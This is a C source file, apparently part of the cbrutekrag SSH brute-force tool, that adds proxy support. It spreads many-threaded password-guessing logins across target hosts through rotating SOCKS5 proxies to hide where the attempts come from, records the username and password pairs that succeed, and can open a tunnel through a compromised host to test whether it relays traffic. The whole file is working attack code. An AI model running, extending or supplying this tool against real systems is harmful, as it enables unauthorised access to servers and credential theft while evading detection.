/*
 * bruteforce_proxy_ssh.c
 * Proxy-aware bruteforce worker variant.
 *
 * - Uses btkg_proxy_get_next() for thread-safe proxy selection.
 * - Validates proxy canary and IP before use; aborts on corruption so sanitizer/gdb
 *   can capture an immediate stack trace.
 * - Allocates thread array on heap to avoid stack bloat.
 *
 * Note: This file expects the following headers/types to exist in your project:
 *   - cbrutekrag.h (defines btkg_context_t, btkg_options_t, etc.)
 *   - proxy_list.h (defines btkg_proxy_list_t, btkg_proxy_t, BTKG_PROXY_CANARY)
 *   - log.h (log_error, log_info, log_debug, log_warn)
 *
 */

#define _POSIX_C_SOURCE 200809L

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h> /* close */
#include <stdlib.h>
#include <pthread.h>

#include <libssh/libssh.h>

#include "cbrutekrag.h"
#include "log.h"
#include "proxy_list.h"
#include "proxy.h" /* for btkg_proxy_socks5_connect prototype */

/* Forward declarations (if any) */

/* --------------------------------------------------------------------------
 * Thread-safe proxy accessor
 *
 * Returns pointer to a proxy entry owned by context->proxies (do not free).
 * If no proxies configured returns NULL.
 *
 * This function:
 *  - holds context->lock while reading and advancing the index
 *  - ensures the index is within bounds (repairs and logs otherwise)
 *  - validates the entry's canary and basic contents (ip not empty)
 *  - aborts on corruption so sanitizers / gdb can capture a precise backtrace
 * -------------------------------------------------------------------------- */
static btkg_proxy_t *btkg_proxy_get_next(btkg_context_t *context)
{
	if (!context) return NULL;

	btkg_proxy_list_t *pl = &context->proxies;
	btkg_proxy_t *px = NULL;

	pthread_mutex_lock(&context->lock);

	/* no proxies configured */
	if (pl->proxies == NULL || pl->count == 0) {
		pthread_mutex_unlock(&context->lock);
		return NULL;
	}

	/* repair corrupted index if necessary */
	if (context->proxies_idx >= pl->count) {
		log_error("btkg_proxy_get_next: proxies_idx %zu >= count %zu; resetting to 0",
			  context->proxies_idx, pl->count);
		context->proxies_idx = 0;
	}

	size_t idx = context->proxies_idx;
	px = &pl->proxies[idx];

	/* advance index for next caller (wrap) */
	context->proxies_idx = (idx + 1) % pl->count;

	pthread_mutex_unlock(&context->lock);

	/* Validate entry canary and ip */
	if (px->canary != BTKG_PROXY_CANARY) {
		log_error("btkg_proxy_get_next: proxy canary corrupted at idx=%zu (canary=0x%08x). Aborting.",
			  idx, (unsigned)px->canary);
		abort(); /* immediate core for gdb / sanitizer */
	}

	if (px->ip[0] == '\0') {
		log_error("btkg_proxy_get_next: proxy IP empty at idx=%zu. Aborting.", idx);
		abort();
	}

	return px;
}

/* --------------------------------------------------------------------------
 * bruteforce_ssh_login_proxy
 *
 * Establishes a proxied TCP tunnel to hostname:port via SOCKS5 proxy and
 * performs the libssh login flow using the proxied fd.
 * Returns:
 *   0  => success (valid credentials)
 *  -1  => normal failure (bad creds / connection)
 *  -2..-6 => different fatal errors (kept similar to original)
 * -------------------------------------------------------------------------- */
int bruteforce_ssh_login_proxy(btkg_context_t *context, const char *hostname,
			       uint16_t port, const char *username,
			       const char *password,
			       const char *proxy_ip, uint16_t proxy_port)
{
	ssh_session session = NULL;
	int verbosity = 0;
	btkg_options_t *options = &context->options;

	if (options->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
		verbosity = SSH_LOG_PROTOCOL;
	} else {
		verbosity = SSH_LOG_NOLOG;
	}

	session = ssh_new();
	if (session == NULL) {
		log_error("Cant create SSH session.");
		return -1;
	}

	if (!proxy_ip || proxy_ip[0] == '\0' || proxy_port == 0) {
		log_error("Invalid proxy provided to bruteforce_ssh_login_proxy.");
		ssh_free(session);
		return -1;
	}

	int proxied_fd = -1;
	/* Use proxy helper to establish proxied TCP connection to hostname:port */
	if (btkg_proxy_socks5_connect(context, proxy_ip, proxy_port,
				      hostname, port, &proxied_fd) != 0) {
		log_debug("Failed to connect to %s:%u via proxy %s:%u",
			  hostname, (unsigned)port, proxy_ip,
			  (unsigned)proxy_port);
		ssh_free(session);
		return -1;
	}

	int timeout = options->timeout;
	ssh_options_set(session, SSH_OPTIONS_HOST, hostname);
	ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	ssh_options_set(session, SSH_OPTIONS_PORT, &(int){ port });
	ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
	ssh_options_set(session, SSH_OPTIONS_USER, username);

	/* Provide already-connected socket FD to libssh so it uses the proxied socket */
	ssh_options_set(session, SSH_OPTIONS_FD, &proxied_fd);

	int r = ssh_connect(session);
	if (r != SSH_OK) {
		if (options->verbose & CBRUTEKRAG_VERBOSE_MODE) {
			log_error("[!] Error connecting to %s:%d %s.", hostname,
				  port, ssh_get_error(session));
		}
		if (proxied_fd >= 0) close(proxied_fd);
		ssh_free(session);
		return -1;
	}

	r = ssh_userauth_none(session, NULL);
	if (r == SSH_AUTH_SUCCESS) {
		log_debug("[!] %s:%d - Server without authentication.", hostname, port);
		ssh_disconnect(session);
		ssh_free(session);
		if (proxied_fd >= 0) close(proxied_fd);
		return -1;
	}

	if (r == SSH_AUTH_ERROR) {
		log_debug("[!] %s:%d - ssh_userauth_none(): A serious error happened.", hostname, port);
		ssh_disconnect(session);
		ssh_free(session);
		if (proxied_fd >= 0) close(proxied_fd);
		return -1;
	}

	int method = ssh_userauth_list(session, NULL);

	if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
		r = ssh_userauth_password(session, NULL, password);
		if (r == SSH_AUTH_SUCCESS) {
			/* Credentials accepted */
			if (options->check_http != NULL) {
				ssh_channel channel = ssh_channel_new(session);
				if (channel == NULL) {
					log_error("Error ssh_channel_new: %s", ssh_get_error(session));
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -2;
				}

				log_debug("%s:%d %s %s - Opening tunnel (via proxy)...",
					  hostname, port, username, password);
				r = ssh_channel_open_forward(channel, options->check_http, 80,
							    "localhost", 0);
				if (r != SSH_OK) {
					log_error("Error ssh_channel_open_forward: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -3;
				}

				char buffer[1024];
				int nbytes;
				/* safe formatting into buffer */
				snprintf(buffer, sizeof(buffer),
					 "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
					 options->check_http);

				r = ssh_channel_write(channel, buffer, (uint32_t)strlen(buffer));
				if (r == SSH_ERROR) {
					log_error("Error ssh_channel_write: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -4;
				}

				nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
				if (nbytes == 0) {
					log_warn("%s:%d %s %s - http-check empty response", hostname, port, username, password);
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -6;
				}

				if (nbytes < 0) {
					log_error("Error ssh_channel_read: %s", ssh_get_error(session));
					if (channel) {
						ssh_channel_close(channel);
						ssh_channel_free(channel);
					}
					ssh_disconnect(session);
					ssh_free(session);
					if (proxied_fd >= 0) close(proxied_fd);
					return -5;
				}

				if (channel) {
					ssh_channel_close(channel);
					ssh_channel_free(channel);
				}
			}

			ssh_disconnect(session);
			ssh_free(session);
			if (proxied_fd >= 0) close(proxied_fd);
			return 0;
		}
	}

	ssh_disconnect(session);
	ssh_free(session);
	if (proxied_fd >= 0) close(proxied_fd);
	return -1;
}

/* --------------------------------------------------------------------------
 * bruteforce_ssh_try_login_proxy
 * Wrapper that adapts $TARGET substitution and logs successes.
 * -------------------------------------------------------------------------- */
int bruteforce_ssh_try_login_proxy(btkg_context_t *context, const char *hostname,
				   const uint16_t port, const char *username,
				   const char *password,
				   const char *proxy_ip, uint16_t proxy_port)
{
	const char *_password = strcmp(password, "$TARGET") == 0 ? hostname : password;
	const char *_username = strcmp(username, "$TARGET") == 0 ? hostname : username;

	int ret = bruteforce_ssh_login_proxy(context, hostname, port, _username, _password,
					     proxy_ip, proxy_port);

	if (ret == 0) {
		log_info("\033[32m[+]\033[0m %s:%d %s %s", hostname, port, _username, _password);
		if (context->output != NULL) {
			btkg_log_successfull_login(context->output,
						   context->options.bruteforce_output_format,
						   hostname, port, _username, _password);
		}
	} else {
		log_debug("\033[38m[-]\033[0m %s:%d %s %s", hostname, port, _username, _password);
	}

	return ret;
}

/* --------------------------------------------------------------------------
 * Worker function (proxy variant)
 * - Fetches work items in a loop
 * - Uses btkg_proxy_get_next() to select proxies safely
 * -------------------------------------------------------------------------- */
static void *btkg_bruteforce_worker_proxy(void *ptr)
{
	btkg_context_t *context = (btkg_context_t *)ptr;
	if (!context) return NULL;

	btkg_target_list_t *targets = &context->targets;
	btkg_credentials_list_t *credentials = &context->credentials;
	btkg_proxy_list_t *proxies = &context->proxies;
	btkg_options_t *options = &context->options;

	for (;;) {
		pthread_mutex_lock(&context->lock);

		/* If we've exhausted targets for the current credential, advance credential
		   and also advance proxy index (wrap-around). Keep these index ops under the lock. */
		if (context->targets_idx >= targets->length) {
			context->targets_idx = 0;
			context->credentials_idx++;

			/* whenever credential index is increased, advance proxy index too (defensive) */
			if (proxies->count > 0) {
				context->proxies_idx = (context->proxies_idx + 1) % proxies->count;
			}
		}

		/* If we've exhausted credentials -> stop */
		if (context->credentials_idx >= credentials->length) {
			pthread_mutex_unlock(&context->lock);
			break;
		}

		/* fetch work item (target + credential) while holding lock */
		btkg_target_t *target = &targets->targets[context->targets_idx++];
		btkg_credentials_t *combo = &credentials->credentials[context->credentials_idx];

		/* increment global attempt counter */
		context->count++;

		pthread_mutex_unlock(&context->lock);

		/* select proxy (thread-safe) - may return NULL if no proxies configured */
		btkg_proxy_t *pxy = btkg_proxy_get_next(context);

		const char *proxy_ip = NULL;
		uint16_t proxy_port = 0;
		if (pxy != NULL) {
			proxy_ip = pxy->ip;
			proxy_port = pxy->port;
		} else {
			/* No proxies configured - behavior: skip attempt when not dry run */
			if (!options->dry_run) {
				log_debug("No proxy configured; skipping attempt for %s:%d", target->host, target->port);
				continue;
			}
		}

		if (!options->dry_run) {
			int ret = bruteforce_ssh_try_login_proxy(context,
					target->host, target->port,
					combo->username, combo->password,
					proxy_ip, proxy_port);
			if (ret == 0) {
				pthread_mutex_lock(&context->lock);
				context->successful++;
				pthread_mutex_unlock(&context->lock);
			}
		} else {
			const char *proxy_str = proxy_ip ? proxy_ip : "no-proxy";
			log_debug("\033[38m[-]\033[0m %s:%d %s %s (proxy=%s:%u)",
				  target->host, target->port, combo->username,
				  combo->password, proxy_str, (unsigned)proxy_port);
		}
	}

	return NULL;
}

/* --------------------------------------------------------------------------
 * Start brute-force (proxy variant)
 * - Allocates thread array on heap
 * -------------------------------------------------------------------------- */
void btkg_bruteforce_start_proxy(btkg_context_t *context)
{
	if (!context) return;
	btkg_options_t *options = &context->options;

	/* guard: don't try to create absurd amount of threads without sanity */
	if (options->max_threads == 0) {
		log_error("btkg_bruteforce_start_proxy: max_threads is 0");
		return;
	}

	pthread_t *scan_threads = calloc(options->max_threads, sizeof(pthread_t));
	if (!scan_threads) {
		log_error("btkg_bruteforce_start_proxy: failed to allocate thread array (count=%zu)", options->max_threads);
		return;
	}

	int ret;
	for (size_t i = 0; i < (size_t)options->max_threads; i++) {
		log_debug("Creating thread (proxy): %zu", i);
		ret = pthread_create(&scan_threads[i], NULL, btkg_bruteforce_worker_proxy, (void *)context);
		if (ret != 0) {
			log_error("Thread creation failed: %d", ret);
		}
	}

	for (size_t i = 0; i < (size_t)options->max_threads; i++) {
		int jret = pthread_join(scan_threads[i], NULL);
		if (jret != 0) {
			log_error("Cannot join thread no: %d", jret);
		}
	}

	free(scan_threads);
}
